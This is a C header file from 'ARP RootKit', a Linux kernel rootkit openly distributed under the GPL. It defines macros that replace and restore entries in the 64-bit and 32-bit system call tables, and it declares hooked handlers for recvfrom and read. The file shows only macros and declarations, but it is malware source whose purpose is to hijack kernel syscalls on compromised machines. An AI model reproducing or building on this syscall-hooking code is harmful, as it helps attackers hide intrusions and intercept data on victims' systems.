/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers.
 */

#ifndef HOOKS_H

/*
 * Macros.
 */
#define MAP_FAILED     ((void *) -1)

/*
 * (Un)Hooking macros.
 */
#define HOOK64(nr, handler) my_sct[nr] = handler
#define HOOK32(nr, handler) my_ia32sct[nr] = handler
#define UNHOOK64(nr) my_sct[nr] = sys_call_table[nr]
#define UNHOOK32(nr) my_ia32sct[nr] = ia32_sys_call_table[nr]

/*
 * Hook handlers.
 */
extern int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
extern int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
extern int my_read64(int fd, void __user *buf, size_t len);
extern int my_read32(int fd, void __user *buf, size_t len);

#define HOOKS_H
#endif
